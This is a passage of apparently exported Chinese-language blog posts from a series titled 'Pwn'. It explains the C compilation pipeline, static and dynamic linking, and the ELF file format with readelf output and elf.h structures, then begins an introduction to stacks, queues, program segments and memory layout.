服務狀態查看, 啟動, 停止, 重新啟動。\nReferences # 《循環執行的工作排程 - dywang》https://dywang.csie.cyut.edu.tw/dywang/linuxSystem/node71.html\n","date":"2022/10/20","externalUrl":null,"permalink":"/posts/ubuntu-crontab/","section":"","summary":"","title":"Ubuntu \"Crontab\" 工作排程","type":"posts"},{"content":" Compiling # 在過去，計算機概論課程中，講者及教材上往往會這麼解釋高階語言到執行檔的過程：\n計概所說的編譯過程 但事實上，該過程可以被拆解成更詳細的步驟，如下圖：\n更詳細的編譯過程 東西突然有點多，先大致說明一下表示方式：\n…(虛線)：使用或透過什麼工具。 →(箭頭)：所產生的結果。 顏色表示對象：\n█ 紫色區域：編譯過程的前後，也表示開頭與結尾。 █ 黃色區域：所使用的工具，通常工具本身也是程式。 █ 藍色區域：檔案的各個階段。 這兩項會再特別提出說明：\n█ 綠色區域：執行檔。 █ 橘色區域：Loader (載入器)，用於將程式傾印到記憶體上的程式。 先從最左上角的 █ 紫色區域 開始觀看：\n1. 撰寫 Source Code # Developer (開發者)透過Editor (編輯器)撰寫程式(高階語言)，此刻的檔案為Source Code (原始碼)。該步驟應該撰寫過程式的都不陌生。\n2. 產生優化後的 Source Code # 接著當你開始嘗試編譯該檔案時，其實當下並非直接編譯，而是會先透過一個叫做「Preprocessor (預處理器)」的程式對 Source Code 進行優化，刪除原始碼中的Comment (註解)(程式執行是不需要註解的)，並將其中所使用到的Library (函式庫)檔案路徑給標記上去，方便後續連結程式。而透過Preprocessor處理後所產生的檔案稱為「Expanded Source Code」，其檔案內容大概長這個樣子(此刻對觀看已經非常不友善了)：\n3. 編譯成 Assembly Language # 接著就透過Compiler (編譯器)對優化過的原始檔進行Compile (編譯)，之後產出Assembly Language (組合語言)檔案。其檔案內容大致長這樣(對於只寫過高階語言的朋友來說，應該已經進到另外一個領域了)：\n4. 組譯成 Object File # 已經有了Assembly Language (組合語言)檔案，那麼就可以透過Assembler (組譯器)翻譯成Machine Code (機器語言)，而在Assemble (組譯)成Executable (執行檔)之前，其實還可以分成兩個步驟。在開始組譯後，會先產生出「Object File (目的檔)」，該檔案已經是Binary了，而Object File中會標記著各種所需要的Library (函式庫)位置，此刻的Library還並未被整合成一個檔案。除此之外，該檔案裡頭還會存放前一章提到檔案中的各種區段，包括.text、.data、.rodata、.bss等，但在這邊，正確來說應該稱呼它們為「Sections」，而不是「Segments」，這部份稍後再提，只要先知道這是指一樣的東西即可。此刻檔案中已經包含各個Section的資料，也就是說程式主體已經都被轉成Binary了，距離完成只差最後一步，就是將Library也整合進來。\n5. 連結成 Executable # 為了完成最後整合Library的步驟，因此就有了Linker (連結器)。舉例在Ubuntu 20OS 下，沒意外的話Linker位置會在「/lib/ld-linux.so.2」，而這只是一個捷徑，該捷徑所指向的檔案才是真正的Linker，但每台裝置所使用的 Linker 來源或是版本可能不同，例如我的捷徑連結至「/lib/i386-linux-gnu/ld-2.31.so」。到了編譯的最後一步，將Object File與那些Library統整成一個可執行檔，當然Object File可能包含數個，一樣可以進行合併，最後產生出Executable (執行檔)。\n6. Loader # 到目前為止，Executable已經被生產出來。\n儘管已經在第五步驟將Library給連結了，但\u0026hellip; 並不代表程式全部都會被合併。\n在一般廣義上的Link (連結)可以被分成兩種來看，一種是「Static Linking (靜態連結)」，另外一種則是「Dynamic Linking (動態連結)」。這主要關聯到Library中的「Statically-Linked Library (靜態連結函式庫)」及「Dynamic-Link Library (動態連結函式庫)」：\nStatically-Linked Library (靜態連結函式庫) 在LinuxOS 上，靜態庫本身包含著ELF檔案，但自身並非是ELF檔案，通常為「.a」副檔名，表示「Archive」，如同字面上的意思，如果 ELF 是書的話，那他就是裝書的書櫃。其內容多半較為簡單，無複雜操作，過於複雜、龐大的程式更適合以動態連結的方式進行，以避免最終產出的執行檔過大。 在透過Linker連結的過程中會被合併至Object File當中。 Dynamic-Link Library (動態連結函式庫) 與靜態連結函式庫最大的不同在於，動態連結函式庫並不會被直接整合到執行檔中，Um\u0026hellip; 至少在Linking階段不會。 由於不會預先被整合進執行檔，因此要求各個環境之間需擁有相同函式庫才能夠在開啟執行檔時被預期的載入相關程式碼。 WindowsOS 中常見的.dll檔便是「Dynamic-Link Library」的縮寫。 從上述內容可以發現，動態庫在執行檔生成的連結過程中，僅僅是被作為標記使用，而真正的程式碼則是在程式啟動時才被載入，並且若開發人員使用的動態函式庫在使用者環境上沒有或是版本有著差異，那將可能無法順利執行程式。\n其實說到這已經很明顯了，Loader指的正是用於在程式啟動時，協助載入動態庫的程式。\n至於\u0026hellip; 前面提到的「ELF」是什麼？\nWhat is ELF? # 「ELF」為一種檔案格式，全稱為「Executable and Linkable Format (可執行與可連結格式)」，在過去也被稱作「Extensible Linking Format」，是一種Unix的執行檔格式。\nELF檔案主要有三種類型，分別是「Executable (執行檔)」、「Object File (目的檔)」、「Shared Object (動態鏈接庫、共享庫)」。\nExecutable：在前面已經提到了，這也應該是大家最為熟悉的。在LinuxOS 下副檔名多半為.out、無附檔名等。 Object File：又稱作「Relocatable」，前面提到時沒說到，但Object File也是ELF檔案。在LinuxOS 下副檔名多半為.o。 Shared Object：又稱作「Shared Library」，其實與Executable大致相同，最大差異僅僅是Shared Object可用於共享，時常用於程式動態連結階段被Loader連結的子程式，而Executable則通常不被當子程式使用，除此之外\u0026hellip; 似乎是一樣的，總之就\u0026hellip; 都是執行檔。在LinuxOS 下副檔名多半為.so。 而ELF檔案是可以被大致分成四塊區域來看的，分別是：\nELF Header # 作為檔頭當然就是紀錄著檔案的一些基本資訊啦！\n包含標示著該檔案是 ELF；是什麼類型的 ELF；為幾位元系統執行檔；版本；記憶體資料存放方式(Little-or-Big Endian)\u0026hellip; 等。\n當然也包括標注Program Header與Section Header Table在檔案中的位置，這麼一來就可以透過該檔頭定位所有區塊了。\n舉例，我有一執行檔名為「hello-word」，透過指令「readelf -h hello-world」即可查看該檔案的Header：\n1ELF Header: 2 Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 3 Class: ELF64 4 Data: 2\u0026#39;s complement, little endian 5 Version: 1 (current) 6 OS/ABI: UNIX - System V 7 ABI Version: 0 8 Type: DYN (Shared object file) 9 Machine: Advanced Micro Devices X86-64 10 Version: 0x1 11 Entry point address: 0x10a0 12 Start of program headers: 64 (bytes into file) 13 Start of section headers: 12616 (bytes into file) 14 Flags: 0x0 15 Size of this header: 64 (bytes) 16 Size of program headers: 56 (bytes) 17 Number of program headers: 13 18 Size of section headers: 64 (bytes) 19 Number of section headers: 29 20 Section header string table index: 28 這些資訊倒也不用全都了解，但基本的要先知道就好。\n從圖中可以看見，Header中有一個叫做Magic的數字串，又被稱作「Magic Number (魔法數字)」，佔了檔案最開頭的16 Bytes，Magic Number對於檔案辨識是重要的一個指標，這些數字也被統稱「EI_IDENT」。\nMagic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00\n0x00 ~ 0x03(EI_MAG0 ~ EI_MAG3)：開頭的「7f」同時也是執行檔中的第一個字節，表記著該檔案是可執行檔。接著的「45」、「4c」、「46」表示著格式，也就是「ELF」三個英文字所個別對應的ASCII Code。 0x04(EI_CLASS)：。欲執行檔案的系統位元，目前大多是使用0x02，也就是64-Bits，而0x01表示32-Bits。(為什麼沒有16-Bits呢？詳情可以看這篇文章：「linux - Why there is no 16-bit information in ELF magic number? - Stack Overflow」) 0x05(EI_DATA)：資料於記憶體中的存放格式，大多數為0x01，代表Little-Endian，目前大多數系統都是採用這種格式的。而0x02則表示Big-Endian(關於 Big-Endian 更多資訊可以看這篇文章：「Big Endian 與他們的現狀 - HackMD」)。若是你還不懂Big-Endian及Little-Endian是什麼的話，也不用擔心，之後該系列文章提到時會再詳細說明。 0x06(EI_VERSION)：標示了ELF版本，但就目前應該只會看見0x01，也就是第一版本，未來可能會繼續更新也說不定。 0x07(EI_OSABI)：標記著「OS Application Binary Interface」，也就是該 ELF 檔案於何統作業系統上運作(至於什麼是ABI，可以看維基百科解釋：應用二進位介面 - Wiki)。而例子中該欄位值為「0x00」，表示未指定。 0x08(EI_ABIVERSION)：標示「Application Binary Interface Version」，意思是該 ELF 檔案所使用的ABI版本。(該字節可以為0x00，用以表示不指定版本) 0x09 ~ 0x15(EI_PAD)：僅僅是用於「Padding (填充)」，剛好湊個 2 的次方數(16 Bytes)，也是給未來的版本預留資訊的儲存空間。 至於這些資訊，剛才所說的指令會自動將這些資訊整理成文字顯示，各位就不用辛苦的記憶對應的意思了，例如上面終端輸出的這段：\n1Class: ELF64 2Data: 2\u0026#39;s complement, little endian 3Version: 1 (current) 4OS/ABI: UNIX - System V 5ABI Version: 0 6Type: DYN (Shared object file) 7Machine: Advanced Micro Devices X86-64 8Version: 0x1 Program Header # 接著是Program Header。\n該區塊用於存放關於執行檔於執行時的必要資訊，包含動態連結函式庫為何、各個Segments對應Sections的分佈、Segments的權限(是否可讀/寫/執行\u0026hellip;)等。\n一樣拿hello-world這支檔案舉例，透過指令「readelf -l hello-world」可以查看檔案的Program Header：\n1Elf file type is DYN (Shared object file) 2Entry point 0x10a0 3There are 13 program headers, starting at offset 64 4 5Program Headers: 6 Type Offset VirtAddr PhysAddr 7 FileSiz MemSiz Flags Align 8 PHDR 0x0000000000000040 0x0000000000000040 0x0000000000000040 9 0x00000000000002d8 0x00000000000002d8 R 0x8 10 INTERP 0x0000000000000318 0x0000000000000318 0x0000000000000318 11 0x000000000000001c 0x000000000000001c R 0x1 12 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] 13 LOAD 0x0000000000000000 0x0000000000000000 0x0000000000000000 14 0x0000000000000790 0x0000000000000790 R 0x1000 15 LOAD 0x0000000000001000 0x0000000000001000 0x0000000000001000 16 0x00000000000002a5 0x00000000000002a5 R E 0x1000 17 LOAD 0x0000000000002000 0x0000000000002000 0x0000000000002000 18 0x00000000000001b0 0x00000000000001b0 R 0x1000 19 LOAD 0x0000000000002d88 0x0000000000003d88 0x0000000000003d88 20 0x0000000000000288 0x00000000000003d0 RW 0x1000 21 DYNAMIC 0x0000000000002da0 0x0000000000003da0 0x0000000000003da0 22 0x0000000000000200 0x0000000000000200 RW 0x8 23 NOTE 0x0000000000000338 0x0000000000000338 0x0000000000000338 24 0x0000000000000020 0x0000000000000020 R 0x8 25 NOTE 0x0000000000000358 0x0000000000000358 0x0000000000000358 26 0x0000000000000044 0x0000000000000044 R 0x4 27 GNU_PROPERTY 0x0000000000000338 0x0000000000000338 0x0000000000000338 28 0x0000000000000020 0x0000000000000020 R 0x8 29 GNU_EH_FRAME 0x0000000000002014 0x0000000000002014 0x0000000000002014 30 0x0000000000000054 0x0000000000000054 R 0x4 31 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 32 0x0000000000000000 0x0000000000000000 RW 0x10 33 GNU_RELRO 0x0000000000002d88 0x0000000000003d88 0x0000000000003d88 34 0x0000000000000278 0x0000000000000278 R 0x1 35 36 Section to Segment mapping: 37 Segment Sections... 38 00 39 01 .interp 40 02 .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 41 03 .init .plt .plt.got .plt.sec .text .fini 42 04 .rodata .eh_frame_hdr .eh_frame 43 05 .init_array .fini_array .dynamic .got .data .bss 44 06 .dynamic 45 07 .note.gnu.property 46 08 .note.gnu.build-id .note.ABI-tag 47 09 .note.gnu.property 48 10 .eh_frame_hdr 49 11 50 12 .init_array .fini_array .dynamic .got 資訊很多，按部就班來讀，主要先找到「Program Headers:」，先單看這塊區域：\n1 Type Offset VirtAddr PhysAddr 2 FileSiz MemSiz Flags Align 3 PHDR 0x0000000000000040 0x0000000000000040 0x0000000000000040 4 0x00000000000002d8 0x00000000000002d8 R 0x8 5 INTERP 0x0000000000000318 0x0000000000000318 0x0000000000000318 6 0x000000000000001c 0x000000000000001c R 0x1 7 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] 8 LOAD 0x0000000000000000 0x0000000000000000 0x0000000000000000 9 0x0000000000000790 0x0000000000000790 R 0x1000 10 LOAD 0x0000000000001000 0x0000000000001000 0x0000000000001000 11 0x00000000000002a5 0x00000000000002a5 R E 0x1000 12 LOAD 0x0000000000002000 0x0000000000002000 0x0000000000002000 13 0x00000000000001b0 0x00000000000001b0 R 0x1000 14 LOAD 0x0000000000002d88 0x0000000000003d88 0x0000000000003d88 15 0x0000000000000288 0x00000000000003d0 RW 0x1000 16 DYNAMIC 0x0000000000002da0 0x0000000000003da0 0x0000000000003da0 17 0x0000000000000200 0x0000000000000200 RW 0x8 18 NOTE 0x0000000000000338 0x0000000000000338 0x0000000000000338 19 0x0000000000000020 0x0000000000000020 R 0x8 20 NOTE 0x0000000000000358 0x0000000000000358 0x0000000000000358 21 0x0000000000000044 0x0000000000000044 R 0x4 22 GNU_PROPERTY 0x0000000000000338 0x0000000000000338 0x0000000000000338 23 0x0000000000000020 0x0000000000000020 R 0x8 24 GNU_EH_FRAME 0x0000000000002014 0x0000000000002014 0x0000000000002014 25 0x0000000000000054 0x0000000000000054 R 0x4 26 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 27 0x0000000000000000 0x0000000000000000 RW 0x10 28 GNU_RELRO 0x0000000000002d88 0x0000000000003d88 0x0000000000003d88 29 0x0000000000000278 0x0000000000000278 R 0x1 在最上面標示了欄位名稱(有兩行)，分別是「Type」、「Offset」、「VirtAddr」、「PhysAddr」、「FileSiz」、「MemSiz」、「Flags」、「Align」。\n該Program Header Table的結構可以在檔案「/usr/include/elf.h」中找到：\n1/* Program segment header. */ 2 3typedef struct 4{ 5 Elf32_Word p_type; /* Segment type */ 6 Elf32_Off p_offset; /* Segment file offset */ 7 Elf32_Addr p_vaddr; /* Segment virtual address */ 8 Elf32_Addr p_paddr; /* Segment physical address */ 9 Elf32_Word p_filesz; /* Segment size in file */ 10 Elf32_Word p_memsz; /* Segment size in memory */ 11 Elf32_Word p_flags; /* Segment flags */ 12 Elf32_Word p_align; /* Segment alignment */ 13} Elf32_Phdr; 14 15typedef struct 16{ 17 Elf64_Word p_type; /* Segment type */ 18 Elf64_Word p_flags; /* Segment flags */ 19 Elf64_Off p_offset; /* Segment file offset */ 20 Elf64_Addr p_vaddr; /* Segment virtual address */ 21 Elf64_Addr p_paddr; /* Segment physical address */ 22 Elf64_Xword p_filesz; /* Segment size in file */ 23 Elf64_Xword p_memsz; /* Segment size in memory */ 24 Elf64_Xword p_align; /* Segment alignment */ 25} Elf64_Phdr; 對照上面所看到的欄位可以發現是一樣的，並且在右方有著註解告知該欄位為 Segment 的什麼資訊。\n這麼一來我們就可以知道各個欄位代表的是什麼了，接著先來看剛剛輸出的那些Type分別代表什麼，一樣在/usr/include/elf.h中可以找到如下資訊：\n1/* Legal values for p_type (segment type). */ 2 3#define PT_NULL 0 /* Program header table entry unused */ 4#define PT_LOAD 1 /* Loadable program segment */ 5#define PT_DYNAMIC 2 /* Dynamic linking information */ 6#define PT_INTERP 3 /* Program interpreter */ 7#define PT_NOTE 4 /* Auxiliary information */ 8#define PT_SHLIB 5 /* Reserved */ 9#define PT_PHDR 6 /* Entry for header table itself */ 10#define PT_TLS 7 /* Thread-local storage segment */ 11#define PT_NUM 8 /* Number of defined types */ 12#define PT_LOOS 0x60000000 /* Start of OS-specific */ 13#define PT_GNU_EH_FRAME 0x6474e550 /* GCC .eh_frame_hdr segment */ 14#define PT_GNU_STACK 0x6474e551 /* Indicates stack executability */ 15#define PT_GNU_RELRO 0x6474e552 /* Read-only after relocation */ 16#define PT_LOSUNW 0x6ffffffa 17#define PT_SUNWBSS 0x6ffffffa /* Sun Specific segment */ 18#define PT_SUNWSTACK 0x6ffffffb /* Stack segment */ 19#define PT_HISUNW 0x6fffffff 20#define PT_HIOS 0x6fffffff /* End of OS-specific */ 21#define PT_LOPROC 0x70000000 /* Start of processor-specific */ 22#define PT_HIPROC 0x7fffffff /* End of processor-specific */ 對照剛剛表中有的Type分別是：\nPHDR Entry for header table itself\n指Program Header，也就是該表本身的資訊。 INTERP Program interpreter\n基本上就是標記著要連結動態函式庫所使用的程式，以Linux來說就是之前所提到的/lib/i386-linux-gnu/ld-2.31.so。 LOAD Loadable program segment\n要載入的區段，包含Text Segment及Data Segment\u0026hellip; 等。 DYNAMIC Dynamic linking information\n動態連結的相關資訊。 NOTE Auxiliary information\n只是輔助用的，此區是非必要的。 GNU_PROPERTY\n請自行閱讀linux-abi-draft.pdf 2.1.5的部份 GNU_EH_FRAME GCC .eh_frame_hdr segment GNU_STACK Indicates stack executability GNU_RELRO Read-only after relocation 最後這四項暫時不討論。\nSections # 要查看hello-world這個檔案的Sections，可以使用指令「readelf -S hello-world」：\n1There are 29 section headers, starting at offset 0x3148: 2 3Section Headers: 4 [Nr] Name Type Address Offset 5 Size EntSize Flags Link Info Align 6 [ 0] NULL 0000000000000000 00000000 7 0000000000000000 0000000000000000 0 0 0 8 [ 1] .interp PROGBITS 0000000000000318 00000318 9 000000000000001c 0000000000000000 A 0 0 1 10 [ 2] .note.gnu.propert NOTE 0000000000000338 00000338 11 0000000000000020 0000000000000000 A 0 0 8 12 [ 3] .note.gnu.build-i NOTE 0000000000000358 00000358 13 0000000000000024 0000000000000000 A 0 0 4 14 [ 4] .note.ABI-tag NOTE 000000000000037c 0000037c 15 0000000000000020 0000000000000000 A 0 0 4 16 [ 5] .gnu.hash GNU_HASH 00000000000003a0 000003a0 17 0000000000000028 0000000000000000 A 6 0 8 18 [ 6] .dynsym DYNSYM 00000000000003c8 000003c8 19 0000000000000108 0000000000000018 A 7 1 8 20 [ 7] .dynstr STRTAB 00000000000004d0 000004d0 21 0000000000000117 0000000000000000 A 0 0 1 22 [ 8] .gnu.version VERSYM 00000000000005e8 000005e8 23 0000000000000016 0000000000000002 A 6 0 2 24 [ 9] .gnu.version_r VERNEED 0000000000000600 00000600 25 0000000000000040 0000000000000000 A 7 2 8 26 [10] .rela.dyn RELA 0000000000000640 00000640 27 0000000000000108 0000000000000018 A 6 0 8 28 [11] .rela.plt RELA 0000000000000748 00000748 29 0000000000000048 0000000000000018 AI 6 24 8 30 [12] .init PROGBITS 0000000000001000 00001000 31 000000000000001b 0000000000000000 AX 0 0 4 32 [13] .plt PROGBITS 0000000000001020 00001020 33 0000000000000040 0000000000000010 AX 0 0 16 34 [14] .plt.got PROGBITS 0000000000001060 00001060 35 0000000000000010 0000000000000010 AX 0 0 16 36 [15] .plt.sec PROGBITS 0000000000001070 00001070 37 0000000000000030 0000000000000010 AX 0 0 16 38 [16] .text PROGBITS 00000000000010a0 000010a0 39 00000000000001f5 0000000000000000 AX 0 0 16 40 [17] .fini PROGBITS 0000000000001298 00001298 41 000000000000000d 0000000000000000 AX 0 0 4 42 [18] .rodata PROGBITS 0000000000002000 00002000 43 0000000000000014 0000000000000000 A 0 0 4 44 [19] .eh_frame_hdr PROGBITS 0000000000002014 00002014 45 0000000000000054 0000000000000000 A 0 0 4 46 [20] .eh_frame PROGBITS 0000000000002068 00002068 47 0000000000000148 0000000000000000 A 0 0 8 48 [21] .init_array INIT_ARRAY 0000000000003d88 00002d88 49 0000000000000010 0000000000000008 WA 0 0 8 50 [22] .fini_array FINI_ARRAY 0000000000003d98 00002d98 51 0000000000000008 0000000000000008 WA 0 0 8 52 [23] .dynamic DYNAMIC 0000000000003da0 00002da0 53 0000000000000200 0000000000000010 WA 7 0 8 54 [24] .got PROGBITS 0000000000003fa0 00002fa0 55 0000000000000060 0000000000000008 WA 0 0 8 56 [25] .data PROGBITS 0000000000004000 00003000 57 0000000000000010 0000000000000000 WA 0 0 8 58 [26] .bss NOBITS 0000000000004040 00003010 59 0000000000000118 0000000000000000 WA 0 0 64 60 [27] .comment PROGBITS 0000000000000000 00003010 61 000000000000002b 0000000000000001 MS 0 0 1 62 [28] .shstrtab STRTAB 0000000000000000 0000303b 63 000000000000010a 0000000000000000 0 0 1 64Key to Flags: 65 W (write), A (alloc), X (execute), M (merge), S (strings), I (info), 66 L (link order), O (extra OS processing required), G (group), T (TLS), 67 C (compressed), x (unknown), o (OS specific), E (exclude), 68 l (large), p (processor specific) 可以看到除先前所介紹的.text、.bss、.data、.rodata等 Sections 外，還多了許多 Sections。\n至於其他未介紹的 Sections 作用為何，煩請讀者自行尋找相關資料，在此為防離題及篇幅過長不做討論。\n另外，如同Program Header Table一樣，Section Header Table結構也能於檔案「/usr/include/elf.h」中找到：\n1/* Section header. */ 2 3typedef struct 4{ 5 Elf32_Word sh_name; /* Section name (string tbl index) */ 6 Elf32_Word sh_type; /* Section type */ 7 Elf32_Word sh_flags; /* Section flags */ 8 Elf32_Addr sh_addr; /* Section virtual addr at execution */ 9 Elf32_Off sh_offset; /* Section file offset */ 10 Elf32_Word sh_size; /* Section size in bytes */ 11 Elf32_Word sh_link; /* Link to another section */ 12 Elf32_Word sh_info; /* Additional section information */ 13 Elf32_Word sh_addralign; /* Section alignment */ 14 Elf32_Word sh_entsize; /* Entry size if section holds table */ 15} Elf32_Shdr; 16 17typedef struct 18{ 19 Elf64_Word sh_name; /* Section name (string tbl index) */ 20 Elf64_Word sh_type; /* Section type */ 21 Elf64_Xword sh_flags; /* Section flags */ 22 Elf64_Addr sh_addr; /* Section virtual addr at execution */ 23 Elf64_Off sh_offset; /* Section file offset */ 24 Elf64_Xword sh_size; /* Section size in bytes */ 25 Elf64_Word sh_link; /* Link to another section */ 26 Elf64_Word sh_info; /* Additional section information */ 27 Elf64_Xword sh_addralign; /* Section alignment */ 28 Elf64_Xword sh_entsize; /* Entry size if section holds table */ 29} Elf64_Shdr; 以及 Table 結構的解釋：\n1/* Legal values for sh_type (section type). */ 2 3#define SHT_NULL 0 /* Section header table entry unused */ 4#define SHT_PROGBITS 1 /* Program data */ 5#define SHT_SYMTAB 2 /* Symbol table */ 6#define SHT_STRTAB 3 /* String table */ 7#define SHT_RELA 4 /* Relocation entries with addends */ 8#define SHT_HASH 5 /* Symbol hash table */ 9#define SHT_DYNAMIC 6 /* Dynamic linking information */ 10#define SHT_NOTE 7 /* Notes */ 11#define SHT_NOBITS 8 /* Program space with no data (bss) */ 12#define SHT_REL 9 /* Relocation entries, no addends */ 13#define SHT_SHLIB 10 /* Reserved */ 14#define SHT_DYNSYM 11 /* Dynamic linker symbol table */ 15#define SHT_INIT_ARRAY 14 /* Array of constructors */ 16#define SHT_FINI_ARRAY 15 /* Array of destructors */ 17#define SHT_PREINIT_ARRAY 16 /* Array of pre-constructors */ 18#define SHT_GROUP 17 /* Section group */ 19#define SHT_SYMTAB_SHNDX 18 /* Extended section indeces */ 20#define SHT_NUM 19 /* Number of defined types. */ 21#define SHT_LOOS 0x60000000 /* Start OS-specific. */ 22#define SHT_GNU_ATTRIBUTES 0x6ffffff5 /* Object attributes. */ 23#define SHT_GNU_HASH 0x6ffffff6 /* GNU-style hash table. */ 24#define SHT_GNU_LIBLIST 0x6ffffff7 /* Prelink library list */ 25#define SHT_CHECKSUM 0x6ffffff8 /* Checksum for DSO content. */ 26#define SHT_LOSUNW 0x6ffffffa /* Sun-specific low bound. */ 27#define SHT_SUNW_move 0x6ffffffa 28#define SHT_SUNW_COMDAT 0x6ffffffb 29#define SHT_SUNW_syminfo 0x6ffffffc 30#define SHT_GNU_verdef 0x6ffffffd /* Version definition section. */ 31#define SHT_GNU_verneed 0x6ffffffe /* Version needs section. */ 32#define SHT_GNU_versym 0x6fffffff /* Version symbol table. */ 33#define SHT_HISUNW 0x6fffffff /* Sun-specific high bound. */ 34#define SHT_HIOS 0x6fffffff /* End OS-specific type */ 35#define SHT_LOPROC 0x70000000 /* Start of processor-specific */ 36#define SHT_HIPROC 0x7fffffff /* End of processor-specific */ 37#define SHT_LOUSER 0x80000000 /* Start of application-specific */ 38#define SHT_HIUSER 0x8fffffff /* End of application-specific */ References # 《Linux系统中编译、链接的基石-ELF文件：扒开它的层层外衣，从字节码的粒度来探索-面包板社区》https://www.eet-china.com/mp/a60007.html 《Wiki - 靜態函式庫》https://zh.wikipedia.org/zh-tw/%E9%9D%99%E6%80%81%E5%BA%93 《Wiki - 動態連結函式庫》https://zh.wikipedia.org/zh-tw/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93 《linux - What\u0026rsquo;s the difference of section and segment in ELF file format - Stack Overflow》https://stackoverflow.com/questions/14361248/whats-the-difference-of-section-and-segment-in-elf-file-format 《執行檔格式 - ELF - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天》https://ithelp.ithome.com.tw/articles/10222650 ","date":"2022/10/13","externalUrl":null,"permalink":"/posts/pwn-0x02-compile-and-elf/","section":"","summary":"","title":"《Pwn - 0x02》What did the \"Compilation\" do? And what is ELF?","type":"posts"},{"content":" Stack (堆疊, 棧) # 在開始說明執行中的程式在記憶體當中長什麼樣之前，首先必須先了解什麼是Stack (堆疊)。\n在資料結構中，Stack (堆疊)是基本且重要的結構之一，且日常生活中處處可見，例如撲克牌、彈夾、漢堡(？)\n漢堡 Stack 可以看到漢堡的各個部份被堆疊起來，而堆疊結構有個特性 — 「先進後出，FILO (First In, Last Out)」。\n試想製作漢堡的過程是在桌面上，放上最底層的麵包，接著疊上生菜、牛肉。\n當要將材料拿下來時，則必須是先拿起最上方的牛肉，接著拿下生菜，最後才是第一個放上的麵包。\n(P.s. 堆疊一次只更動一個項目，也就是說在上述例子中，不能將生菜跟牛肉一起拿起來)\n在堆疊最上方添加物件稱作「Push」，而拿取 Stack 最上方物件的動作則稱作「Pop」。\n基本上這就是堆疊，很好理解對吧！在Pwn的過程會時常見到它 :)\nQueue (佇列, 堆) # 提到Stack就不得不跟著提到Queue (佇列)。\n與堆疊不同的是，Queue有著「先進先出，FIFO (First In, First Out)」的特性。\n在生活中的例子有摩天輪、排隊等。\n排隊 Queue 假設排隊點餐的情境下有一隊伍如上圖：\n排在首位的是王小明，也稱為「Head」，也就是佇列的「頭」；\n而排在最末端的是「新之助」，也稱作「Tail」，為佇列的「尾」。\n其FIFO特性為，當排隊點餐時，先排的人有先點餐的優先權。\n若要添加新的物件，則從後方添加。\n(摩天輪亦是如此，先坐上的人，會先轉完一圈回到地面。)\nSegments and Sections # 字面上來說，「Segment」表示「段」，而「Section」則是翻譯成「節」，是差不多的意思\u0026hellip;\n這兩個詞在現今的計算機領域中已被混淆使用著，許多場合人們並不會在意這兩個詞的區別。\n後續的內文將其統稱「區段」、「段」，並在必要時用英文區分。\n可以想像，在寫程式時所建立的Functions、Variables、Constants\u0026hellip; 都需要被存放在執行檔中，而不同類型的資料被存放在不同的區域用以區分，這些區域就稱作「Sections」。\n「Segment」則可以理解成是這些Sections的劃分群組，舉例常看到的兩個用於存放資料的Sections，分別叫做「.data」與「.bss」(做什麼的等等再解釋)，這兩個Sections所在的Segment就被稱作Data Segment (資料段)。\n而一個Segment可以包含0 個或多個Section。另外，通常Section的名字前方都會有個英文句號「.」作為前綴。\n各個Segments都有著不同的用途，以下將說明最基礎的兩個Segments的作用：\nText Segment (文字區段) # 又稱作Code Segment (程式區段)，用以存放程式碼與唯讀資料的區段。\n通常包含著像是.text、.rodata、.plt、.plt.got、.dynsym等Sections。\n.text (.code) # 又被寫作「.code」，如其名為存放程式碼的區段。(此指的程式碼為Machine-Language Instructions (機器碼指令集)，畢竟已經是執行檔了，所以存放的是二進制程式碼)(P.s. 目前較主流的指令集架構為 Intel x86，沒聽過沒關係，暫時先留個眼就好)\n且由於該區段不需要被修改，因此通常是Read-Only (唯讀)的，也防止非預期錯誤而竄改到指令碼。(程式碼是用來執行的，因此只需要Read，你不太需要在編譯完後又修改執行檔本身)\n.rodata # 「ro」為「Read-Only (唯讀)」的縮寫，用於存放唯讀的資料。理論上Const (常數)會被存放於.rodata，但編譯器也可能會將部份直接寫在.text區段，至於原因可以觀看這篇文章：「c - GCC: why constant variables not placed in .rodata - Stack Overflow」。\nData Segment (資料區段) # 該區段用以存放Global Variable (全域變數)，並且是是可寫區域。\n通常包含著像是.data、.bss、.got等Sections。\n.data # 又稱「已初始化資料區段 (Initialized Data Segment)」，用以存放已初始化的Global Variable (全域變數)。\n.bss # 又稱「未初始化資料區段 (Uninitialized Data Segment)」，「bss」為「Block Started by Symbol」之縮寫。該區段用於存放未初始化的Global Variable (全域變數)，該區段的這些未被初始化的資料會在程式執行時被定義成Null(或0)。\nP.s. 若變數被初始化為0、Null，則可能在編譯過程轉而被寫進.bss Section。\n請注意，上述的內容並不是代表該Segment內僅僅存在這些Sections，而只是抓取幾個重要基礎作討論。\nStack, Heap # Stack與Heap指的是記憶體上的區域，雖然也會被稱作Stack Segment與Heap Segment，但與剛才所提的Segments並不同。剛才所提的那些Segments是存放於執行檔中靜態存在的，當該執行檔執行時，檔中的Segments將會被複製到記憶體上，接著開始執行。\n而Stack與Heap則是會在程式執行時才被創建在記憶體中，且隨著程式執行更動內容。\nStack # .textSection 中會被存放各個「Function (函式)的相關資訊」及其中的 Local Variable (區域變數)，然後在程式運作過程中陸續被放到Stack當中(隨著程式執行到相關資料，屆時資料才會被放上Stack)。並且Stack上的資料會在各Function執行結束後，自動回收刪除該 Function 所使用的區域，因此不太需要擔心記憶體不夠使用的問題。\nFunction (函式)的相關資訊又包含Arguments (參數)、Return Address (返回位址)等。\n(P.s. 這部份之後會再提到，先大概知道是在存放什麼即可)\nStack的大小是固定的，該區段屬於Static Memory Allocation (靜態記憶體分配)，也就是說在執行程式之前，儘管Stack並未被創建，但其大小是可以被計算出來的。\nHeap # 寫過C++之類語言的人可能也用過Pointer (指標)，這種Reference Type Variable 